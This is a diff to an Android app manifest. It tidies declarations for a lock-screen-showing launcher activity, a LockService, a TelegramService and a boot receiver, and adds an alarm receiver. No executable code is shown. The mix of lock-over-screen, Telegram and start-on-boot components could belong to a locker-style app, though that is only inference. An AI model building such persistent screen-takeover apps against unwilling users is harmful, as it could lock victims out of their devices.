@@ -19,27 +19,20 @@
             android:exported="true"
             android:launchMode="singleTask"
             android:showWhenLocked="true"
-            android:turnScreenOn="true"
-            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale|smallestScreenSize|screenLayout|uiMode">
+            android:turnScreenOn="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <service
-            android:name=".LockService"
-            android:exported="false" />
-        <service
-            android:name=".TelegramService"
-            android:exported="false" />
-        <receiver
-            android:name=".BootReceiver"
-            android:exported="true">
+        <service android:name=".LockService" android:exported="false" />
+        <service android:name=".TelegramService" android:exported="false" />
+        <receiver android:name=".AlarmReceiver" android:exported="false" />
+        <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-
     </application>
 </manifest>
